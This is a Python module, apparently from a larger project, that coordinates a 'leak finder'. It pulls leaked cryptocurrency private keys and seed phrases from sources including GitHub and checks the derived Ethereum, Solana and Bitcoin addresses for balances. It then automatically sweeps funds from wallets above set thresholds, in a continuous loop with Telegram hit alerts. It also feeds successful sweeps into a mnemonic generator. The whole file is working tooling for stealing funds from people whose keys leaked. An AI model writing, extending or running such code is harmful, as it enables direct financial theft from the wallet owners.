"""Leak finder coordinator."""
from __future__ import annotations
import asyncio
import hashlib
import importlib
import logging
import os
import pathlib
from dataclasses import dataclass, field
from datetime import datetime, timezone
from typing import Optional
from src.modules.crypto.balance.chains import ALL_CHAINS, ChainConfig, ChainType, chain_by_name
from src.modules.crypto.balance.checker import check_btc_balance, check_balance
from src.modules.crypto.balance.hit_logger import HitLogger
from src.modules.crypto.balance.multicall import batch_check_balances, batch_check_sol_balances
from src.modules.crypto.balance.sweeper import Sweeper, SweepResult
from src.modules.crypto.balance.scanner_coordinator import ScannerCoordinator
from src.modules.crypto.leak_finder.extractor import ExtractedKey, extract_keys
from src.modules.crypto.leak_finder.sources.github_source import RawLeak

logger = logging.getLogger(__name__)

@dataclass
class LeakFinderResult:
    raw_leaks_fetched: int = 0
    keys_extracted: int = 0
    keys_deduplicated: int = 0
    addresses_checked: int = 0
    funded_wallets: int = 0
    sweep_results: list[SweepResult] = field(default_factory=list)
    errors: list[str] = field(default_factory=list)
    started_at: datetime = field(default_factory=lambda: datetime.now(timezone.utc))
    completed_at: Optional[datetime] = None
    @property
    def elapsed_seconds(self) -> float:
        return (self.completed_at - self.started_at).total_seconds() if self.completed_at else 0.0


def _discover_sources() -> dict[str, type]:
    """Auto-discover source classes from the sources directory.

    Scans for *_source.py files, imports each module, and finds the class
    that ends with 'Source'. This way adding a new source = just dropping
    a file in sources/ — no coordinator modification needed.
    """
    source_map: dict[str, type] = {}
    sources_dir = pathlib.Path(__file__).parent / "sources"
    for py_file in sorted(sources_dir.glob("*_source.py")):
        module_name = py_file.stem  # e.g. "github_source"
        # Derive the source key: "github_source" -> "github"
        key = module_name.replace("_source", "")
        try:
            module = importlib.import_module(
                f"src.modules.crypto.leak_finder.sources.{module_name}"
            )
            # Find the class ending with "Source"
            for attr_name in dir(module):
                attr = getattr(module, attr_name)
                if (
                    isinstance(attr, type)
                    and attr_name.endswith("Source")
                    and attr_name != "RawLeak"
                    and hasattr(attr, "fetch_raw_leaks")
                ):
                    source_map[key] = attr
                    break
        except Exception as exc:
            logger.debug("Failed to auto-discover source %s: %s", module_name, exc)
    return source_map


_SOURCE_MAP = _discover_sources()
ALL_SOURCES = list(_SOURCE_MAP.keys())

class LeakFinderCoordinator:
    def __init__(self, sources: Optional[list[str]] = None, chains: Optional[list[ChainConfig]] = None, hit_logger: Optional[HitLogger] = None, sweeper: Optional[Sweeper] = None, github_token: Optional[str] = None, db_path: str = "wallet_hits.db", api_concurrency: int = 50):
        self._source_names = sources or list(ALL_SOURCES)
        self._chains = chains or list(ALL_CHAINS)
        self._hit_logger = hit_logger
        self._sweeper = sweeper
        self._github_token = github_token or os.getenv("GITHUB_TOKEN", "")
        self._db_path = db_path
        self._api_concurrency = api_concurrency
        from src.modules.crypto.balance.bloom import BloomFilter
        self._seen_keys: set[str] = set()
        self._seen_keys_bf = BloomFilter(expected_items=100_000, fp_rate=0.001)
        self._seen_addresses: set[str] = set()
        self._seen_addresses_bf = BloomFilter(expected_items=500_000, fp_rate=0.001)
        self._coordinator: Optional[ScannerCoordinator] = None
        self._running = False

    async def start(self) -> None:
        self._coordinator = ScannerCoordinator(api_concurrency=self._api_concurrency, chains=self._chains, db_path=self._db_path)
        await self._coordinator.start()
        if self._hit_logger is None:
            self._hit_logger = HitLogger(db_path=self._db_path, telegram_token=os.getenv("TELEGRAM_BOT_TOKEN", ""), telegram_chat_id=os.getenv("TELEGRAM_CHAT_ID", ""))
            await self._hit_logger.start()
        if self._sweeper is None:
            self._sweeper = Sweeper()
        self._running = True

    async def stop(self) -> None:
        self._running = False
        if self._coordinator:
            await self._coordinator.stop()
            self._coordinator = None
        if self._sweeper:
            await self._sweeper.close()
            self._sweeper = None

    async def run_once(self) -> LeakFinderResult:
        result = LeakFinderResult()
        # Ensure sweeper is initialized
        if self._sweeper is None:
            self._sweeper = Sweeper()
        raw_leaks = await self._fetch_all_sources()
        result.raw_leaks_fetched = len(raw_leaks)
        all_keys = self._extract_and_deduplicate(raw_leaks)
        result.keys_deduplicated = result.keys_extracted = len(all_keys)
        funded_keys = await self._check_balances(all_keys)
        result.addresses_checked = sum(len(k.derived_addresses) for k in all_keys)
        result.funded_wallets = len(funded_keys)
        if funded_keys:
            result.sweep_results = await self._sweep_funded(funded_keys)
            # Record hit patterns for successfully swept mnemonics
            for sr in result.sweep_results:
                if sr.success:
                    for key in funded_keys:
                        if key.key_type == KeyType.MNEMONIC:
                            try:
                                from src.modules.crypto.balance.smart_generator import SmartMnemonicGenerator
                                gen = SmartMnemonicGenerator()
                                gen.add_hit_pattern(key.key_raw)
                                logger.info("Recorded hit pattern from successful sweep")
                            except Exception:
                                pass
        result.completed_at = datetime.now(timezone.utc)
        return result

    async def search_address(self, address: str) -> LeakFinderResult:
        result = LeakFinderResult()
        tasks = []
        for name in self._source_names:
            source = self._create_source(name)
            if source:
                tasks.append(self._search_source_for_address(source, address))
        if tasks:
            search_results = await asyncio.gather(*tasks, return_exceptions=True)
            for res in search_results:
                if isinstance(res, list):
                    result.raw_leaks_fetched += len(res)
                    for leak in res:
                        keys = extract_keys(leak.text)
                        for key in keys:
                            kid = hashlib.sha256(key.key_raw.encode("utf-8")).hexdigest()
                            if self._seen_keys_bf.contains(kid):
                                continue
                            self._seen_keys_bf.add(kid)
                            if kid not in self._seen_keys:
                                self._seen_keys.add(kid)
                                if self._coordinator and self._coordinator.is_mnemonic_seen(key.key_raw):
                                    continue
                                if self._coordinator:
                                    self._coordinator.mark_mnemonic_seen(key.key_raw, source=leak.source_url or "unknown")
                                result.keys_deduplicated += 1
        result.completed_at = datetime.now(timezone.utc)
        return result

    async def run_continuous(self, interval_sec: int = 300) -> None:
        while self._running:
            try:
                await self.run_once()
            except Exception as exc:
                logger.error("Cycle error: %s", exc)
            await asyncio.sleep(interval_sec)

    def _create_source(self, name: str):
        cls = _SOURCE_MAP.get(name)
        if cls is None:
            return None
        # GitHub source needs the token
        if name == "github":
            return cls(github_token=self._github_token)
        return cls()

    async def _fetch_all_sources(self) -> list[RawLeak]:
        tasks = []
        for name in self._source_names:
            source = self._create_source(name)
            if source:
                tasks.append(self._fetch_source(source, name))
        if not tasks:
            return []
        results = await asyncio.gather(*tasks, return_exceptions=True)
        all_leaks: list[RawLeak] = []
        for res in results:
            if isinstance(res, list):
                all_leaks.extend(res)
        return all_leaks

    async def _fetch_source(self, source, source_name: str) -> list[RawLeak]:
        try:
            return await source.fetch_raw_leaks()
        except Exception as exc:
            logger.error("Error fetching from %s: %s", source_name, exc)
            return []

    async def _search_source_for_address(self, source, address: str) -> list[RawLeak]:
        try:
            return await source.search_for_address(address)
        except Exception:
            return []

    def _extract_and_deduplicate(self, raw_leaks: list[RawLeak]) -> list[ExtractedKey]:
        all_keys: list[ExtractedKey] = []
        for leak in raw_leaks:
            try:
                for key in extract_keys(leak.text):
                    kid = hashlib.sha256(key.key_raw.encode("utf-8")).hexdigest()
                    # Fast bloom filter check first
                    if self._seen_keys_bf.contains(kid):
                        continue
                    self._seen_keys_bf.add(kid)
                    # In-memory exact set
                    if kid not in self._seen_keys:
                        self._seen_keys.add(kid)
                        # Persistent SQLite dedup via coordinator
                        if self._coordinator and self._coordinator.is_mnemonic_seen(key.key_raw):
                            continue
                        if self._coordinator:
                            self._coordinator.mark_mnemonic_seen(key.key_raw, source=leak.source_url or "unknown")
                        all_keys.append(key)
            except Exception:
                pass
        return all_keys

    # Minimum balances worth sweeping (must cover: fee + rent-exempt + meaningful transfer)
    # SOL: 5000 fee + 890880 rent-exempt + 1000 min transfer = 895880 lamports
    _MIN_SOL_LAMPORTS = 2_000_000   # 0.002 SOL — covers all costs with margin
    _MIN_EVM_WEI = 500_000_000_000_000  # 0.0005 ETH — covers gas
    _MIN_BTC_SATS = 5_000  # 0.00005 BTC

    async def _check_balances(self, keys: list[ExtractedKey]) -> list[ExtractedKey]:
        funded: list[ExtractedKey] = []
        evm_addrs: list[str] = []
        evm_keys: list[ExtractedKey] = []
        sol_addrs: list[str] = []
        sol_keys: list[ExtractedKey] = []
        btc_addrs: list[tuple[str, ExtractedKey]] = []

        for key in keys:
            for chain_name, address in key.derived_addresses.items():
                if self._seen_addresses_bf.contains(address):
                    continue
                self._seen_addresses_bf.add(address)
                if address in self._seen_addresses:
                    continue
                self._seen_addresses.add(address)
                cfg = chain_by_name(chain_name)
                if cfg is None:
                    continue
                if cfg.chain_type == ChainType.EVM:
                    evm_addrs.append(address)
                    evm_keys.append(key)
                elif cfg.chain_type == ChainType.SOLANA:
                    sol_addrs.append(address)
                    sol_keys.append(key)
                elif cfg.chain_type == ChainType.BITCOIN:
                    btc_addrs.append((address, key))

        if evm_addrs:
            eth = chain_by_name("Ethereum")
            if eth:
                try:
                    results = await batch_check_balances(evm_addrs, eth)
                    for i, r in enumerate(results):
                        if r.balance_wei >= self._MIN_EVM_WEI:
                            funded.append(evm_keys[i])
                        elif r.balance_wei > 0:
                            logger.debug("Skipping dust EVM: %s (%d wei)", r.address[:10], r.balance_wei)
                except Exception as exc:
                    logger.error("EVM batch error: %s", exc)

        if sol_addrs:
            try:
                results = await batch_check_sol_balances(sol_addrs)
                for i, r in enumerate(results):
                    if r.balance_wei >= self._MIN_SOL_LAMPORTS:
                        funded.append(sol_keys[i])
                    elif r.balance_wei > 0:
                        logger.debug("Skipping dust SOL: %s (%d lamports)", r.address[:10], r.balance_wei)
            except Exception as exc:
                logger.error("SOL batch error: %s", exc)

        for addr, key in btc_addrs:
            try:
                r = await check_btc_balance(addr)
                if r.balance >= self._MIN_BTC_SATS / 1e8:
                    funded.append(key)
                elif r.balance > 0:
                    logger.debug("Skipping dust BTC: %s (%.8f)", addr[:10], r.balance)
            except Exception:
                pass

        # Filter out known unsweepable addresses (program-owned nonce accounts etc)
        _SKIP_ADDRS = {"HAgk14JpMQLgt6rVgv7cBQFJWFto5Dqxi472uT3DKpqk"}
        funded = [k for k in funded if not any(a in _SKIP_ADDRS for a in k.derived_addresses.values())]

        return funded

    async def _sweep_funded(self, funded_keys: list[ExtractedKey]) -> list[SweepResult]:
        if not self._sweeper:
            return []
        from src.modules.crypto.balance.deriver import derive_from_mnemonic
        from src.modules.crypto.leak_finder.extractor import KeyType
        results: list[SweepResult] = []
        for key in funded_keys:
            key_hex = key.key_hex
            # For mnemonics, derive private key hex on-the-fly
            if not key_hex and key.key_type == KeyType.MNEMONIC:
                try:
                    derived = derive_from_mnemonic(key.key_raw, chains=list(self._chains))
                    # Build chain_name -> (address, private_key_hex) map
                    key_map: dict[str, tuple[str, str]] = {}
                    for d in derived:
                        if d.private_key_hex:
                            key_map[d.chain] = (d.address, d.private_key_hex)
                except Exception as exc:
                    logger.error("Failed to derive keys from mnemonic: %s", exc)
                    key_map = {}
                for chain_name, address in key.derived_addresses.items():
                    cfg = chain_by_name(chain_name)
                    if not cfg:
                        continue
                    if chain_name not in key_map:
                        continue
                    _, pk_hex = key_map[chain_name]
                    try:
                        bal = await check_balance(address, cfg)
                        if bal.balance <= 0:
                            continue
                        sr = await self._sweeper.sweep(private_key_hex=pk_hex, chain=cfg, source_address=address, balance_raw=bal.balance_raw)
                        results.append(sr)
                    except Exception as exc:
                        logger.error("Sweep error: %s", exc)
            elif key_hex:
                for chain_name, address in key.derived_addresses.items():
                    cfg = chain_by_name(chain_name)
                    if not cfg:
                        continue
                    try:
                        bal = await check_balance(address, cfg)
                        if bal.balance <= 0:
                            continue
                        sr = await self._sweeper.sweep(private_key_hex=key_hex, chain=cfg, source_address=address, balance_raw=bal.balance_raw)
                        results.append(sr)
                    except Exception as exc:
                        logger.error("Sweep error: %s", exc)
        return results
